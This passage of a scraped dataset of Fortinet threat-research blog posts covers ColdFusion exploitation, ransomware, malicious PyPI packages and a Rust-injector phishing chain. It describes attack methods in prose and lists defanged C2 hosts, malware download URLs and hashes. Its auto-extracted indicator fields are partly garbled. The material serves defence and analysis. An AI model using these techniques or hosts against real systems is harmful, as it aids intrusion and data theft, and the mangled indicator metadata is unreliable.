“45sep79asuwcjz8dltu7xtjbtx7yyf7uo6qt9ymfbqxv8gJzsdpyd46hoh6dm8paxklnsw9u7vezwu1dqmjkroryan3zeq1” in Figure 13, this particular campaign can be traced back to 2020. Figure 14 illustrates the presence of the DDoS attack methods associated with RudeMiner. The last entity is the BillGates/Setag backdoor, known for hijacking systems, communicating with C2 servers, and initiating attacks. FortiGuard Labs previouslyreportedon its leveraging a vulnerability on Confluence Servers in 2021. It can be identified via the checking process procedure with the file “bill.lock” shown in Figure 15. The malware’s DDoS attack capabilities, as seen in Figure 16, encompass methods such as SYN, UDP, ICMP, and HTTP-based attacks. We have been tracking this vulnerability for weeks and have observed a significant volume of threat exploitation targeting Adobe ColdFusion. Although the patches for these vulnerabilities have already been released, public attacks are still occurring. We strongly urge users to upgrade affected systems immediately and apply FortiGuard protection to avoid threat probing. This malware is detected and blocked by FortiGuard Antivirus as: ELF/DDoS. BD!trW32/CoinMiner. OHX!wormELF/CoinMiner. HF!trELF/RudeMiner. TGW!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. FortiGuard Labs provides the following IPS signature against attacks exploiting the vulnerability discussed in this report: Adobe. ColdFusion. CVE-2023-38204. Insecure. DeserializationAdobe. ColdFusion. CVE-2023-38203. Insecure. DeserializationAdobe. ColdFusion. CVE-2023-29300. Insecure. Deserialization The FortiGuard Web Filtering Service blocks the attacker’s server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. 81[.]68[.]214[.]12281[.]68[.]197[.]382[.]156[.]147[.]183 103[.]255[.]177[.]55:6895 7c6f0bae1e588821bd5d66cd98f52b7005e054279748c2c851647097fa2ae2df590d3088ed566cb3d85d48f4914cc657ee49b7d33e85c72167e7c72d81d4cb6c808f0f85aee6be3d3f3dd4bb827f556401c4d69a642ba4b1cb3645368954622e4f22fea4d0fadd2e01139021f98f04d3cae678e6526feb61fa8a6eceda13296a FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities",
      "scraped_at": "2025-07-20T13:53:59.103252",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ccessmanager",
          "ill"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-38203",
          "CVE-2023-38204",
          "CVE-2023-29300"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.6175514626218852
    }
  },
  {
    "id": "Fortinet_69090",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Trash Panda and A New Minor Variant of NoCry",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers Trash Panda and a new minor variant of the NoCry ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Trash Panda is a ransomware that runs on the Windows platform that was first spotted in early August. It encrypts files on compromised machines, replaces the desktop wallpaper, and drops a ransom note that includes politically themed messages. Information about the infection vector used by the Trash Panda ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. Trash Panda ransomware samples have been submitted to a public file scanning service from the following countries: Once the Trash Panda ransomware is executed, it launches a Command Prompt that clearly states that it’s encrypting files. It encrypts files on the compromised machineexceptfor files with the following file extensions: .diagcab, .cpl, .mod, .bat, .nls, .ldf, .dll, .ps1, .adv, .prf .idx,.rtp, .ocx, .icl, .ani, .cab, .rom, .key, .wpx, .icns, .themepack, .msc, .msp, .cur, .theme, .cmd, .diagpkg, .lnk, .ico, .drv, .bin, .nomedia, .lock, .mpa, .hlp, .scr, .shs, .com, .ics, .hta, .msi, .exe, .diagcfg, .msu, .deskthe, .mepack, .386, .msstyles, .spl, .sys The ransomware adds a “.monochromebear” extension to the files it encrypts. While no definitive conclusion can be made, the following message included in the ransom note provides a clue as to the possible origin of the Trash Panda ransomware and the country it targets: The ransomware also replaces the desktop wallpaper, which asks victims to check the dropped readme file. NoCry is a ransomware designed for the Windows platform that was first discovered in April 2021. NoCry ransomware variants are generated by NoCry ransomware builders and sold on the group’s Telegram channel. It appears that this NoCry ransomware variant was hosted on a website with a URL containing the name of a private bank in India as a string ([bank’s name]-india[.]github[.]io/Start[.]exe), so we believe that the threat actor used the bank as bait or to make the file look legitimate. The NoCry ransomware variant was submitted to a public file scanning service from the following locations: Once executed, this NoCry ransomware variant encrypts files on the compromised machines, adds a \".rcry\" extension to the encrypted files, and displays a ransom note. An interesting aspect of this ransomware is that it specifies USDT-TRC20 as the ransom payment. USDT-TRC20 is a stablecoin issued by Tether on the TRON network. It is pegged to the U. S. dollar and designed so that one USDT is approximately equal to one USD. The Bitly link in the ransom note leads to a Web page of a purported cybersecurity company based in California that offers services such as data encryption, malware removal, and firewalls with pricing plans. The Web site was created using a website builder called “Pineapple Builder.” The Pineapple badge at the bottom right of the Web site indicates that it was created using the free version. To use the services offered by this company, users must pay the fee in the same cryptocurrency to the same address specified by this ransomware. While we cannot say with certainty, it seems likely that the ransomware threat actor fabricated this company or website to collect additional money from users. This also indicates that the group uses multiple traps to increase the financial success of their attack. According to Tronscan (tronscan[.]org), the attacker’s wallet has received a few transactions. Since all incoming transactions have been less than 50 USDT, however, it's safe to assume that neither the NoCry ransomware variant nor the related fake service had successfully victimized anyone at the time of writing. The ransomware also drops a separate ransom note in an HTML file labeled “How to Decrypt My Files.html.” Fortinet customers are already protected from these malware variants through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Trash Panda ransomware sample with the following AV signature: FortiGuard Labs detects the NoCry ransomware variant with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The FortiGuard Web Filtering Service blocks the NoCry ransomware distribution site and the associated potential scam site. File-based IOCs: ce5cf3b964e636d546bf2c52423296bda06b7fe47e6f8a757f165a3be93c88db Trash Panda ransomware 521357a0f9669de4a9233feeef7a3c5299c51de4a2531c56aacc807c0fd25a6a A minor variant of NoCry ransomware Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-trash-panda-and-nocry-variant",
      "scraped_at": "2025-07-20T13:54:07.415800",
      "indicators": {
        "ip_address": [],
        "domain": [
          "iles"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "ce5cf3b964e636d546bf2c52423296bda06b7fe47e6f8a757f165a3be93c88db",
          "521357a0f9669de4a9233feeef7a3c5299c51de4a2531c56aacc807c0fd25a6a"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5155482815057284
    }
  },
  {
    "id": "Fortinet_9433",
    "source": "Fortinet",
    "title": "FortiGuard AI Detects Malicious Packages Hidden in the Python Package Index",
    "text": "FortiGuard Labs Threat Research Python Package Index (PyPI) packages have become a common way for threat actors to post malware that unsuspecting victims may download. The FortiGuard Labs team has been monitoring this attack vector for some time and, earlier this year, began posting a monthly update of the malicious packages we have discovered. Recently, we introduced a new AI engine to our OSS supply chain threats hunting system. We have already discovered several new malicious PyPI attacks using this AI engine assistant. A little preview of our AI engine detection is shown below. This report looks at two sets of malicious PyPI packages published in early July. We have bundled them together by author to demonstrate how it is common for the same author to release several similar or even identical malicious packages using different PyPI account IDs. For example, the packages in the first set were written by a threat actor who goes by the handle Josef M and uses the email address “johannes.mayer@yahoo.com.” The second set was written by an author with the PyPI ID “killskids.” These packages all had a similar project page style, as shown below: Let’s look at one of the packages, “syssqlitedmodules.” The first thing we notice in its __init__.py is a long string of encrypted code that will be run. After decryption, we can see this is a stealer malware, similar to the one we analyzed in aprevious blog. Using a Discord webhook, it tries to steal information, such as credit cards, wallets, account logins, etc. The setup.py in these packages tries to use cmdclass commands that may run when installing the package, as shown below. We can see that this setup.py tries to connect to a URL to download a potentially malicious executable file and run it. However, the payload for this package was unavailable at the time of our writing. This blog shows that the same author often uses different PyPI IDs when posting their malicious packages. This is likely an attempt to spread their malware as much as possible before it is taken down. Using similar code for each package is a quick and easy way for malware authors to distribute malware quickly while increasing its shelf life. Discovering new OSS threats hidden in millions of packages is like looking for a needle in a haystack. Our new AI engine can work far better than traditional approaches, discovering threats in near real-time to protect organizations from malicious threat actors lying in wait. FortiGuard AntiVirus detects the malicious files identified in this report as pycolouringsextV1-1.1.0 __init__.py:Python/Agent. TENR!tr sysfontstoolV1-1.1.0 __init__.py:Python/Agent. TENR!tr syscoloringsaddition-1.1.0 __init__.py:Python/Agent. TENR!tr pitutil-1.0.0 __init__.py:Python/Agent. TENR!tr syssqlitedbmodules-1.1.0 __init__.py:Python/Agent. TENR!tr killskids-auth-1.0.5 setup.py:Python/Agent. SDIK!tr killskids-auth-2.0.0 setup.py:Python/Agent. SDIK!tr testpackageforyoutube-1.0.0 setup.py:Python/Agent. SDIK!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report, that may operate as dependencies in users' projects in test phases and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. pycolouringsextV1-1.1.0 __init__.py 475e15da18cd785eb079981585a6519b sysfontstoolV1-1.1.0 __init__.py 475e15da18cd785eb079981585a6519b syscoloringsaddition-1.1.0 __init__.py 188a8e8f9afb0423276cbe92f8846c47 pitutil-1.0.0 __init__.py f658a9d876041b6434d073d883c72865 syssqlitedbmodules-1.1.0 __init__.py 188a8e8f9afb0423276cbe92f8846c47 killskids-auth-1.0.5 setup.py d643d5f2e8631bcb831e3e79d198a061 killskids-auth-2.0.0 setup.py 9286d9ad57a21c49a06dac2fb7f463ba testpackageforyoutube-1.0.0 setup.py 9c8cbdc00c745407198863372d5ca06c hxxps://github[.]com/killskids/test/raw/main/calc[.]exehxxps://github[.]com/killskids/test/raw/main/auth-server[.]exehxxps://file[.]io/IWbO1KYBw4Bn python,security attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-ai-detects-malicious-packages-in-pypi",
      "scraped_at": "2025-07-20T13:54:16.265341",
      "indicators": {
        "ip_address": [],
        "domain": [
          "etup",
          "ahoo",
          "ohannes"
        ],
        "hash_md5": [
          "f658a9d876041b6434d073d883c72865",
          "9c8cbdc00c745407198863372d5ca06c",
          "188a8e8f9afb0423276cbe92f8846c47",
          "d643d5f2e8631bcb831e3e79d198a061",
          "9286d9ad57a21c49a06dac2fb7f463ba",
          "475e15da18cd785eb079981585a6519b"
        ],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [
          "johannes.mayer@yahoo.com"
        ],
        "url": []
      },
      "threat_score": 0.5317324185248714
    }
  },
  {
    "id": "Fortinet_17048",
    "source": "Fortinet",
    "title": "Attackers Distribute Malware via Freeze.rs And SYK Crypter",
    "text": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim’s device and collects sensitive informationSeverity level:Critical FortiGuard Labs recently detected a new injector written in Rust—one of the fastest-growing programming languages—to inject shellcode and introduce XWorm into a victim’s environment. While Rust is relatively uncommon in malware development, several campaigns have adopted this language since 2019, includingBuer loader,Hive, and RansomExx. FortiGuard Labs analysis also revealed a significant increase in injector activity during May 2023, where the shellcode can be encoded with Base64 and can choose from encryption algorithms such as AES, RC4, or LZMA to evade antivirus detection. By examining the encoded algorithms and API names, we identified the origin of this new injector in the Red Team tool “Freeze.rs,” designed to create payloads able to bypass EDR security controls. Additionally, during our analysis of the attack, we discovered that SYK Crypter—a tool commonly used to deliver malware families via the community chat Discord—was involved in loading Remcos, a sophisticated remote access Trojan (RAT) that can be used to control and monitor devices running Windows. SYK Crypter emerged in 2022 and has been used by various malware families, including AsyncRAT, njRAT, QuasarRAT, WarzoneRAT, and NanoCore RAT. FortiGuard Labs observed phishing email activity on July 13 that initiated an attack chain using a malicious PDF file. This file redirects to an HTML file and utilizes the “search-ms” protocol to access an LNK file on a remote server. Upon clicking the LNK file, a PowerShell script executes Freeze.rs and SYK Crypter for further offensive actions. Eventually, XWorm and Remcos are loaded, and communication with the C2 server is established. In this article, we will delve into the initial attack method employed to deliver the Rust-lang injector, SYK Crypter, and further explore the subsequent stages of the attack. The phishing email, displayed in Figure 1, masquerades as an urgent order supplement request sent to various companies to deceive the recipient. It also employs a blurred image in the PDF file to entice the victim to click a concealed button. The attached PDF file is shown in Figure 2. The malicious URL was hidden in a stream object (/ObjStm), making it challenging to detect. However, extracting the URL by pdf-parser reveals that it is located in object 14 within stream object 1, as shown in Figure 3. Upon clicking the file, the victim connects to the URL https://www[.]cttuae[.]com/ems/page[.]html, a website that seemingly offers travel services. The attacker had uploaded a malicious HTML file to the “ems” path on July 12, with the source code displayed in Figure 4. Instead of directly downloading a virus, the attacker adopts a more sophisticated approach by utilizing the “search-ms” protocol to trigger a search result. Specifically, they search for “ORDER_SPEC0723” on a remote cloud storage server facilitated by DriveHQ. Notably, the file “ORDER_PSEC0723” masquerades as a PDF file icon, but upon closer inspection, it is revealed to be an LNK file that executes a PowerShell script within the same folder, as shown in Figure 5. This tactic allows the attacker to initiate their malicious activities discreetly. The PowerShell script “pf.ps1” (Figure 6) is then executed, beginning with the use of “regsvr32” to launch the injector “doc.dll,” which was written in Rust. It opens the decoy PDF file “T.pdf” and executes “AA.exe.” Finally, all File Explorer windows are closed using “Stop-Process -Force.” The PDF file “T.pdf” in Figure 7 appears clean and contains clear text, intending to distract the victim from other malicious actions. The following section will look in detail at “doc.dll” and “AA.exe.” Figure 8 reveals that the injector was written in the Rust programming language, based on the string section analysis. The injection process begins with creating a “notepad.exe” process using CreateProcessA. The shellcode is subsequently obtained through Base64 decoding and LZMA decompression. The injector then injects the shellcode using functions directly with the NTAPI library. This entire process mirrors the behavior of the Red Team tool “Freeze.rs” which was launched in May, showing rapid adoption of this new tool.” The source code and injector’s assembly code showcased in Figure 9. Over the past month, we’ve compiled a collection of diverse Rust injectors, including DLL files with LZMA-compressed shellcode, DLL files featuring RC4-encrypted shellcode, and EXE files incorporating RC4-encrypted shellcode. The shellcode data within these injectors are all encoded using Base64, and intriguingly, the file type and encryption algorithm appear to be selectable options within the program. This observation aligns seamlessly with the options found in the “Freeze.rs” repository, suggesting a potential connection to this Red Team tool. The flexibility in choosing encryption methods and file types adds to the sophistication of these injectors, further complicating detection and analysis for security researchers. When utilizing the RC4 algorithm variant, the key is expanded to 256 bytes and used in the Pseudo-Random Generation Algorithm (PRGA). The corresponding source code and assembly for this injector variant can be seen in Figure 11. Upon comparison, it becomes evident that this attacker employs “Freeze.rs” to bypass EDRs and utilizes suspended processes. The decrypted shellcode can be found at address 0x650000, as shown in Figure 12. The decrypted shellcode applies AMSI bypass and WDLP bypass techniques, subsequently executing a . NET payload. Once executed, the . NET assembly can be dumped from memory address 0x1AAB6E70, as depicted in Figure 13, allowing for analysis as a stand-alone . NET executable. The . NET payload discovered in the process is known as XWorm, a commodity RAT tool reportedly traded in underground forums. XWorm is equipped with typical RAT functionalities, including gathering machine information, capturing screenshots, logging keystrokes, and establishing control over compromised devices. In this instance, the XWorm payload version is v3.1, and the C2 server information remains hidden on the “pastebin.com” website, as illustrated in Figure 14. The execution file, “AA.exe,” operates as an MSIL downloader and has two links embedded: “95[.]214[.]27[.]17/storage/NAR” and “plunder[.]ddnsguru[.]com/storage/NAR”. Upon download completion, “AA.exe” utilizes the file name “760” as the decoding key and performs a subtraction operation with each byte in the downloaded data. The decoded data is a SYK Crypter with a resource named \"SYKSBIKO,\" which contains the encrypted payload. The DLL file checks to ensure the environment is not in debug mode and then proceeds with processing the resource data by employing RC4 decryption with the key “gOhgyzyDebuggerDisplayAttributei.” It invokes a small . NET code, \"Zlas1,\" for further deflation. To evade detection, SYK Crypter encoded the strings utilized in its execution flow, with the decoding function depicted in Figure 17. Additionally, it employs functions like “GetProcessesByName,” “Directory. Exists,” and “File. Exists” to assess the presence of security appliances within the compromised environment. The list used for checking is found in Figure 18. For persistence, the malware appends the “.exe” extension to the file “AA” and copies the MSIL downloader to the “Startup” folder. It also adds a registry entry “Run” at “HCKU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows.” The corresponding code is depicted in Figures 19 and 20. After RC4 decryption and deflation of the resource data “SYKSBIKO. Properties. Resources.resources‎‎.a,” the execution file is obtained, as shown in Figure 21. SYK Crypter then loads a Base64 . NET code and calls its “GetDelegateForFunctionPointer” function, creating delegation to all APIs from kernel32 or ntdll in the same method. Figure 22 shows a snippet loading “kernel32! WriteProcessMemory,” following which the decrypted payload is injected into a process. The injected payload is the Remcos RAT, originally designed as a legitimate tool for remote computer control. However, since its release in 2016, hackers have exploited it to gain control over victims’ devices. The configuration can be obtained by RC4 decrypting the “SETTINGS” resource, with the clear configuration displayed in Figure 24. Interestingly, the C2 server IP address remains the same as the XWorm payload’s. The combination of XWorm and Remcos creates a formidable trojan with an array of malicious functionalities. The C2 server's traffic report, as shown in Figure 25, reveals Europe and North America as the primary targets of this malicious campaign. As part of their strategy, the phishing campaign utilizes a PDF stream object and leverages the \"search-ms\" feature to entice unsuspecting victims. To further evade detection, threat actors adeptly use the Rust injector \"Freeze.rs\" and the MSIL file \"SYK Crypter.\" In this blog, we delved into the attack methodology employed through phishing emails and examined the various files involved in deceiving victims. Moreover, we provide a comprehensive overview of the functionalities within Freeze.rs and detail the workings of SYK Crypter. Given these developments, users should continue to exercise vigilance in handling suspicious mail and remain alert to potential threats. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PDF/Agent.5D50!trLNK/Agent. AB!trHTML/Agent. S!trW64/Injector. MM!trMSIL/Agent. DWN!trMSIL/Agent. OFI!tr.dldrMSIL/Agent. VJP!trW32/Remcos. A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. freshinxworm[.]ddns[.]netchurchxx[.]ddns[.]netplunder[.]ddnsguru[.]complunder[.]dedyn[.]ioplunder[.]jumpingcrab[.]complunder[.]dynnamn[.]ru 95[.]214[.]27[.]17 40c9d3dec84aa057c167005f860749a2cfa55faa0cddd2fe39aaf3906819203c5a47b18066d8dcd0fbc524f529002cf0a270d8394de928e8426fa06959a8270440041c3240eaa39da781a68f6a60f93577f1b0bbdaee5a0297d7fe329c073baa908656aecc2ae845249acb392fbaa5ba3f8d26b05f4d762afb85b622f7eadcf0ca0efb6da9edbe627ab206a7f494adb42f8483da1d574ddb8f723c1ddfeaecc409505b5cf1541b783f14b1bf1403b918fae70f049d72f47439bd068a43ed8e0a88aeb09dcc59858c9969b7ae1e0e2b58f0aa90b2d27a5edfe9cd82e602ed5952f44e495e1301866188a62916859075ed73d13193823c69884312f04785707279d7e684fe7f3729edd70e2855528af3e634789155d687ed98911d1d2f0200d2a66c6da5a649f9165834c24ac8f7e2332a5612eda54312dcc9f107ab29182e58c9b499cdefac0faa328775ebb6e64b351ee43498532f987743a5a6dcfd5266f20f58235e47d5f5b8218da1d5e9dd3449c4f8969f038bba018521f9884fa1cdf693dd806527cd56244208ee530ee26c90004eb7af343ffdb618c031f63cb1d0e2409ce4e79962ec3e5a307282afcb72b4da39c4a2aace29f3f85c060d8c07cf390547e238a43f9cc38f2d4e449c7d8a557b990e60773ad02820717a634c22b609bec4e613ee1365d8561be02525896c095c8a3fda3199f2f615ab32a644f3d90451b54a4f92b1081f0c10a41c2404d51ed340181c485751efb974113a5cf401ad9cb26144c6e42601f1f1be09ece7c7fcb127637db3b953065648d1b1f371da7e8a904343ba2502d390b36403181e77192a62f31e98c87eb91906fbae27019b4c0d98ab2fc44063d4e00f221e502419d9cca598fafb9e1e00352149327267604bc1 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/malware-distributed-via-freezers-and-syk-crypter",
      "scraped_at": "2025-07-20T13:54:23.034434",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "astebin",
          "otepad",
          "A",
          "reeze",
          "r",
          "esources",
          "oc"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "https://www"
        ]
      },
      "threat_score": 0.29182879377431914
    }
  },
  {
    "id": "Fortinet_88024",
    "source": "Fortinet",
    "title": "Key Findings from the 1H 2023 FortiGuard Labs Threat Report",
    "text": "FortiGuard Labs Threat Research In our1H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year’s first half to identify trends and share insights with security professionals, enabling them to enhance their security strategies and better prioritize patching efforts. The report findings reflect the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors that collect billions of threat events observed worldwide during this same period. Below are key takeaways from the report. In the year's first half, we observed significant activity amongadvanced persistent threat (APT)groups, a rise in ransomware frequency and complexity, increased botnet activity, and much more. And while attack volume isn’t entirely on the continual upward climb we've seen in the past, we’re witnessing breach attempts become more sophisticated and targeted. As cybercriminals continue to advance their tactics, the good news for security practitioners is that much of the malicious activity observed is familiar, giving leaders and their teams ample opportunities to implement effective defense strategies. While ransomware has existed for decades, we’ve witnessed threat actors using more-sophisticated and complex strains in recent years to infiltrate networks, largely thanks to the expansion ofRansomware-as-a-Service (RaaS) operations. Ransomware volume certainly isn't slowing down, either, with ransomware activity ending 13 times higher at the end of 1H 2023 compared to the start of the year. Yet the number of enterprises detecting ransomware on their respective networks is declining: 13% in 1H 2023 compared to nearly 25% five years ago. Unfortunately, this isn’t cause for celebration, as it indicates bad actors carrying out more targeted attacks using highly adaptable playbooks. In several previous reports, we discussed wiper malware, a highly destructive attack technique that \"wipes\" data from infected systems. While we observed asurge in wiper use in early 2022, mainly in conjunction with the Russian-Ukrainian conflict, wiper malware attacks slowed in the first half of 2023. Since its inception, Fortinet has been a core contributor to exploitation activity data supporting theExploit Prediction Scoring System (EPSS). Many vulnerability management teams use EPSS to help prioritize their remediation efforts. But EPSS can also help us track the progression of vulnerabilities from initial disclosure to the outbreak of exploitation in the wild. Our latest report analyzed six years of data spanning more than 11,000 published vulnerabilities for which our sensors detected exploitation. We sought to determine how long it takes for a vulnerability to move from initial release to exploitation, whether vulnerabilities with a high EPSS score get exploited faster, and whether we could predict the average time-to-exploitation using EPSS data. Our analysis shows that the top most exploitable vulnerabilities, as identified by EPSS, are 327 times more likely to be attacked within a week than others on your radar. Using EPSS data in this way can serve as an early warning system. For the first time in the history of our Global Threat Landscape Report, we tracked the number ofactive APT groups. Our research shows that of the 138 cyberthreat groups identified by MITRE, 41 (30%) were active during the first half of the year. Based on our malware detections, Turla, StrongPity, Winnti, OceanLotus, and WildNeutron were the most active. Yet over the past six months, APT-led threats impacted only a small subset of all organizations, indicating that APT endeavors remain highly targeted… at least for now. In this year’s report, we examined longer-term trends regarding unique exploits, malware variants, and botnet activity to give us a greater perspective on today's threat landscape. Our data shows that the count of unique exploit detections is up 68% over the past five years—a sign that attackers are multiplying and diversifying their exploits. However, we also observed a 75% drop in exploitation attempts per organization and a 10% dip in severe exploits, both of which signal that cybercriminals increasingly carry out more-targeted attacks. Malware families and variants have exploded over the past five years, up 135% and 175%, respectively. We also observed more active botnets (+27%) and a higher incidence rate of botnet infection among organizations (+126%). What’s most concerning about botnets is that they have become more persistent over this period, spending more time “lingering” on networks before they’re detected and blocked. Threat actors won’t be slowing down anytime soon, particularly as organized cybercrime groups make it even easier for them to achieve a quick payday. However, there are numerous actions organizations can take today to better protect their networks from these adversaries. Sharing and utilizing threat intelligence has never been more important to combat the ever-increasing sophistication and volume of cyberthreats. Additionally, understanding attack flows—from initial entry points to post-exploitation activities—is vital to creating effective cybersecurity strategies. Finally, there’s no better time to implement new security technologies and reassess your team's processes and playbooks. Developing and maintaining a comprehensive defense strategy is crucial to protecting enterprise networks today and in the future. Our latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet’s vast array of sensors that collect billions of threat events observed worldwide during the first half of this year. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. Download your copy of the1H 2023 FortiGuard Labs Threat Landscape Reporttoday. Threat Report,Threat Landscape Report FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-threat-report-key-findings-1h-2023",
      "scraped_at": "2025-07-20T13:54:31.119053",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5580357142857142
    }
  },
  {
    "id": "Fortinet_7931",
    "source": "Fortinet",
    "title": "Ransomware Roundup - DoDo and Proton",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the DoDo and Proton ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High DoDo ransomware was first reported in February this year. It is a variant of the widely reported and observed Chaos ransomware. Because it is a derivative, the DoDo ransomware is not considered to be a new and recent ransomware. However, a slightly different version of the DoDo ransomware has recently emerged that we describe below. DoDo ransomware samples have the “Mercurial Grabber” file icon, which indicates the ransomware was likely distributed as such. Mercurial Grabber is an open-source malware builder that can generate an infostealer configured to steal information such as Discord tokens, machine information, Windows product keys, and Chrome passwords from victims’ machines. It wasposted on GitHubon June 3, 2021, with the following disclaimer: However, threat actors have been actively using this builder to target victims and steal information by using the built-in functions shown in Figure 2, below. The latest DoDo ransomware samples have been submitted to a public file scanning service from the following countries: Older variants were submitted from the following countries: The masquerading of free apps and tools is a classically simple yet effective attack vector used by cybercriminals for years. However, in this case, the DoDo ransomware is masquerading as the nefarious Mercurial Grabber application, which means that the most likely potential victims are either malicious attackers or curious users. This also makes the abundance of submission sources rather surprising, indicating that users worldwide have all managed to somehow find and download a copy of the fake Mercurial Grabber builder. It is also important to note that the file icon can be easily changed. In other words, it can also impersonate other applications, which all users should be aware of when downloading and using apps off the internet. While the newer and older DoDo variants drop slightly different ransom notes and add different file extensions to 